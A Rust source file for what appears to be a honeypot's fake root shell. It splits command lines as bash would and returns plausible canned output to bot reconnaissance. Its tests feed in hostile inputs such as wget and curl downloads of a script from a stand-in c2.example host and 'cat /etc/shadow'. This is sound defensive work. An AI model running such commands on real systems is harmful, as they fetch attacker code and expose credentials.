// SPDX-License-Identifier: MIT OR Apache-2.0
//! The fake shell: a command line split where bash would run separate
//! commands, and canned answers to what a bot runs first. The line is
//! the client's, so it is hostile; it is already printable text.

/// The host the shell claims to be, from the real one.
pub struct Host {
    /// Short form, as the prompt shows it.
    pub name: String,
    /// `uname -r` and `uname -v`.
    pub release: String,
    pub version: String,
    pub arch: String,
}

/// The most one line prints, however many commands it holds.
pub const MAX_OUT: usize = 16 * 1024;

/// What running a line did.
#[derive(Debug, PartialEq)]
pub struct Ran {
    pub out: String,
    /// Of the last command run.
    pub status: u32,
    /// `exit` or `logout`: the shell ends after this line's output.
    pub exit: bool,
}

const OS_RELEASE: &str = r#"NAME="Rocky Linux"
VERSION="10.2 (Red Quartz)"
RELEASE_TYPE="stable"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="10.2"
PLATFORM_ID="platform:el10"
PRETTY_NAME="Rocky Linux 10.2 (Red Quartz)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:10::baseos"
HOME_URL="https://rockylinux.org/"
VENDOR_NAME="RESF"
VENDOR_URL="https://resf.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2035-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-10"
ROCKY_SUPPORT_PRODUCT_VERSION="10.2"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="10.2"
"#;

const PS: &str = "    PID TTY          TIME CMD\n   2211 pts/0    00:00:00 bash\n   \
    2302 pts/0    00:00:00 ps\n";

const CURL: &str = "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  \
    Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\
    100  1043  100  1043    0     0   9935      0 --:--:-- --:--:-- --:--:--  9933\n";

/// The commands in `line`, each with whether its output goes into a
/// pipe. A separator inside quotes doesn't split.
pub fn split(line: &str) -> Vec<(&str, bool)> {
    fn push<'a>(cmds: &mut Vec<(&'a str, bool)>, c: &'a str, piped: bool) {
        let c = c.trim();
        if !c.is_empty() {
            cmds.push((c, piped));
        }
    }
    let b = line.as_bytes();
    let mut cmds = Vec::new();
    let (mut start, mut i, mut quote) = (0, 0, None);
    while let Some(&c) = b.get(i) {
        i += 1;
        if let Some(q) = quote {
            quote = (c != q).then_some(q);
            continue;
        }
        // Every separator is ASCII, so each cut is on a char boundary.
        let (len, piped) = match (c, b.get(i)) {
            (b'\'' | b'"', _) => {
                quote = Some(c);
                continue;
            }
            (b'&', Some(b'&')) | (b'|', Some(b'|')) => (2, false),
            (b';', _) => (1, false),
            (b'|', _) => (1, true),
            _ => continue,
        };
        push(&mut cmds, &line[start..i - 1], piped);
        i += len - 1;
        start = i;
    }
    push(&mut cmds, &line[start..], false);
    cmds
}

/// What `wget` saves a URL as.
fn saved_as(args: &[&str]) -> String {
    let url = args
        .iter()
        .rev()
        .find(|a| !a.starts_with('-'))
        .unwrap_or(&"");
    let path = url.split(['?', '#']).next().unwrap_or("");
    let path = path.split_once("://").map_or(path, |(_, p)| p);
    match path.rsplit_once('/') {
        Some((_, f)) if !f.is_empty() => f.to_string(),
        _ => "index.html".into(),
    }
}

/// One command's output and status, and whether it ends the shell.
fn answer(cmd: &str, host: &Host, cwd: &mut String) -> (String, u32, bool) {
    let mut words = cmd.split_whitespace();
    let name = words.next().unwrap_or("");
    let args: Vec<&str> = words.collect();
    let out = match name {
        "uname" => {
            let (out, status) = uname(&args, host);
            return (out, status, false);
        }
        "id" => "uid=0(root) gid=0(root) groups=0(root) \
                 context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n"
            .into(),
        "whoami" => "root\n".into(),
        "cat" => {
            let mut status = 0;
            let out = args
                .iter()
                .map(|&a| {
                    if a == "/etc/os-release" {
                        OS_RELEASE.into()
                    } else {
                        status = 1;
                        format!("cat: {a}: No such file or directory\n")
                    }
                })
                .collect();
            return (out, status, false);
        }
        "ls" => "anaconda-ks.cfg\n".into(),
        "pwd" => format!("{cwd}\n"),
        "ps" => PS.into(),
        "w" => {
            let t = time::OffsetDateTime::now_utc();
            format!(
                " {:02}:{:02}:{:02} up 41 days,  3:07,  1 user,  load average: 0.00, 0.01, 0.05\n\
                 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n\
                 root     pts/0    -                {:02}:{:02}    0.00s  0.01s  0.00s w\n",
                t.hour(),
                t.minute(),
                t.second(),
                t.hour(),
                t.minute()
            )
        }
        "wget" => {
            let f = saved_as(&args);
            format!("Saving to: '{f}'\n\n'{f}' saved [1043/1043]\n\n")
        }
        "curl" => CURL.into(),
        "echo" => args.join(" ") + "\n",
        "exit" | "logout" => return (String::new(), 0, true),
        "cd" => match cd(cwd, args.first().copied()) {
            Some(d) => {
                *cwd = d;
                String::new()
            }
            None => {
                let a = args.first().copied().unwrap_or("");
                return (format!("bash: cd: {a}: File name too long\n"), 1, false);
            }
        },
        _ => return (format!("bash: {name}: command not found\n"), 127, false),
    };
    (out, 0, false)
}

/// Runs each command in `line`, telling `each` about it first.
/// The working directory a shell starts in.
pub const HOME: &str = "/root";

/// The prompt bash shows on Rocky in `cwd`.
pub fn prompt(host: &Host, cwd: &str) -> String {
    let dir = match cwd {
        HOME => "~",
        "/" => "/",
        d => d.rsplit('/').next().unwrap_or(d),
    };
    format!("[root@{} {dir}]# ", host.name)
}

/// Where `cd arg` from `cwd` lands, as bash would print it; None past
/// PATH_MAX. No directory is looked at: every one exists.
fn cd(cwd: &str, arg: Option<&str>) -> Option<String> {
    let arg = match arg {
        None | Some("~") => HOME,
        Some(a) => a,
    };
    let arg = arg
        .strip_prefix("~/")
        .map_or(arg.to_string(), |a| format!("{HOME}/{a}"));
    let base = if arg.starts_with('/') { "" } else { cwd };
    let mut parts: Vec<&str> = Vec::new();
    for p in base.split('/').chain(arg.split('/')) {
        match p {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    let dir = format!("/{}", parts.join("/"));
    (dir.len() <= 4096).then_some(dir)
}

/// `uname` with coreutils' flags, in coreutils' order.
fn uname(args: &[&str], host: &Host) -> (String, u32) {
    let fields = [
        ('s', "Linux"),
        ('n', host.name.as_str()),
        ('r', host.release.as_str()),
        ('v', host.version.as_str()),
        ('m', host.arch.as_str()),
        ('p', host.arch.as_str()),
        ('i', host.arch.as_str()),
        ('o', "GNU/Linux"),
    ];
    let mut want = String::new();
    for a in args {
        match *a {
            "--all" => want.push('a'),
            a if a.starts_with('-') && !a.starts_with("--") => want.push_str(&a[1..]),
            a => {
                return (
                    format!(
                        "uname: extra operand '{a}'\nTry 'uname --help' for more information.\n"
                    ),
                    1,
                )
            }
        }
    }
    if let Some(c) = want
        .chars()
        .find(|c| *c != 'a' && !fields.iter().any(|f| f.0 == *c))
    {
        return (
            format!("uname: invalid option -- '{c}'\nTry 'uname --help' for more information.\n"),
            1,
        );
    }
    let all = want.contains('a');
    let out: Vec<&str> = fields
        .iter()
        .filter(|f| all || want.contains(f.0))
        .map(|f| f.1)
        .collect();
    if out.is_empty() {
        ("Linux\n".into(), 0)
    } else {
        (out.join(" ") + "\n", 0)
    }
}

/// Runs each command in `line` from `cwd`, which `cd` moves, telling
/// `each` about each command first.
pub fn run(line: &str, host: &Host, cwd: &mut String, mut each: impl FnMut(&str)) -> Ran {
    let mut r = Ran {
        out: String::new(),
        status: 0,
        exit: false,
    };
    for (cmd, piped) in split(line) {
        each(cmd);
        let (out, status, exit) = answer(cmd, host, cwd);
        // Piped output went to the next command, which ignores it.
        if !piped && r.out.len() + out.len() <= MAX_OUT {
            r.out += &out;
        }
        r.status = status;
        if exit {
            r.exit = true;
            break;
        }
    }
    r
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    pub fn host() -> Host {
        Host {
            name: "web1".into(),
            release: "6.12.0-55.el10.x86_64".into(),
            version: "#1 SMP PREEMPT_DYNAMIC".into(),
            arch: "x86_64".into(),
        }
    }

    fn ran(line: &str) -> (Ran, Vec<String>) {
        let mut seen = Vec::new();
        let r = run(line, &host(), &mut HOME.into(), |c| {
            seen.push(c.to_string())
        });
        (r, seen)
    }

    #[test]
    fn a_line_splits_where_bash_would_run_another_command() {
        assert_eq!(
            split("uname -a; id && cat /etc/os-release | head -1"),
            [
                ("uname -a", false),
                ("id", false),
                ("cat /etc/os-release", true),
                ("head -1", false)
            ]
        );
        assert_eq!(split("a || b"), [("a", false), ("b", false)]);
        assert_eq!(
            split(r#"echo "a;b" 'c|d' | x"#),
            [(r#"echo "a;b" 'c|d'"#, true), ("x", false)]
        );
        // An unclosed quote runs to the end, as bash would ask for more.
        assert_eq!(split("echo 'a;b"), [("echo 'a;b", false)]);
        for empty in ["", "   ", ";;", "&& ||", "|"] {
            assert!(split(empty).is_empty(), "{empty:?}");
        }
        assert_eq!(split("ü;é"), [("ü", false), ("é", false)]);
    }

    #[test]
    fn recon_gets_plausible_answers_and_each_command_is_seen() {
        let (r, seen) = ran("uname -a; id && cat /etc/os-release | head -1");
        assert_eq!(seen, ["uname -a", "id", "cat /etc/os-release", "head -1"]);
        assert_eq!(
            r.out,
            "Linux web1 6.12.0-55.el10.x86_64 #1 SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 \
             GNU/Linux\nuid=0(root) gid=0(root) groups=0(root) \
             context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n\
             bash: head: command not found\n"
        );
        assert_eq!((r.status, r.exit), (127, false));
        for (line, has) in [
            ("whoami", "root\n"),
            ("pwd", "/root\n"),
            ("uname", "Linux\n"),
            (
                "cat /etc/os-release",
                "PRETTY_NAME=\"Rocky Linux 10.2 (Red Quartz)\"",
            ),
            (
                "cat /etc/shadow",
                "cat: /etc/shadow: No such file or directory\n",
            ),
            ("ls -la", "anaconda-ks.cfg"),
            ("ps aux", " bash\n"),
            ("w", "load average"),
            ("wget -q http://c2.example/x.sh", "'x.sh' saved"),
            ("wget http://c2.example/", "'index.html' saved"),
            ("curl -O http://c2.example/x.sh", "100 "),
            ("echo hi  there", "hi there\n"),
        ] {
            let (r, _) = ran(line);
            assert!(r.out.contains(has), "{line}: {:?}", r.out);
        }
        assert_eq!(ran("cd /tmp").0.out, "");
    }

    #[test]
    fn uname_answers_each_flag_as_coreutils_does() {
        for (line, want) in [
            ("uname -s", "Linux\n"),
            ("uname -n", "web1\n"),
            ("uname -r", "6.12.0-55.el10.x86_64\n"),
            ("uname -v", "#1 SMP PREEMPT_DYNAMIC\n"),
            ("uname -m", "x86_64\n"),
            ("uname -p", "x86_64\n"),
            ("uname -i", "x86_64\n"),
            ("uname -o", "GNU/Linux\n"),
            ("uname -m -s", "Linux x86_64\n"),
            ("uname -snrm", "Linux web1 6.12.0-55.el10.x86_64 x86_64\n"),
            ("uname --all", "Linux web1 6.12.0-55.el10.x86_64 #1 SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux\n"),
        ] {
            let (r, _) = ran(line);
            assert_eq!((r.out.as_str(), r.status), (want, 0), "{line}");
        }
        let (r, _) = ran("uname -x");
        assert_eq!(
            (r.out.as_str(), r.status),
            (
                "uname: invalid option -- 'x'\nTry 'uname --help' for more information.\n",
                1
            )
        );
    }

    #[test]
    fn cd_moves_the_prompt_and_pwd() {
        let h = host();
        let mut cwd = String::from(HOME);
        assert_eq!(prompt(&h, &cwd), "[root@web1 ~]# ");
        let mut go = |line: &str| run(line, &h, &mut cwd, |_| {}).out;
        assert_eq!(go("cd /tmp; pwd"), "/tmp\n");
        assert_eq!(go("cd ../var/./log//; pwd"), "/var/log\n");
        assert_eq!(go("cd ..; cd ..; cd ..; pwd"), "/\n");
        assert_eq!(go("cd; pwd"), "/root\n");
        assert_eq!(go("cd x/../y; pwd"), "/root/y\n");
        assert_eq!(go("cd ~; pwd"), "/root\n");
        // A path longer than PATH_MAX is refused, and cd stays put.
        let long = format!("cd {}", "a/".repeat(3000));
        assert!(go(&long).contains("File name too long"));
        assert_eq!(go("pwd"), "/root\n");
        for (dir, want) in [
            ("/root", "~"),
            ("/", "/"),
            ("/var/log", "log"),
            ("/root/y", "y"),
        ] {
            assert_eq!(prompt(&h, dir), format!("[root@web1 {want}]# "), "{dir}");
        }
    }

    #[test]
    fn exit_ends_the_line_there() {
        let (r, seen) = ran("id; exit; whoami");
        assert!(r.exit);
        assert_eq!(seen, ["id", "exit"]);
        assert!(!r.out.contains("root\n"));
        assert!(ran("logout").0.exit);
    }

    #[test]
    fn one_line_prints_at_most_max_out() {
        let line = "cat /etc/os-release;".repeat(200);
        let (r, seen) = ran(&line);
        assert!(r.out.len() <= MAX_OUT, "{}", r.out.len());
        assert!(!r.out.is_empty());
        // Every command is still seen.
        assert_eq!(seen.len(), 200);
    }
}
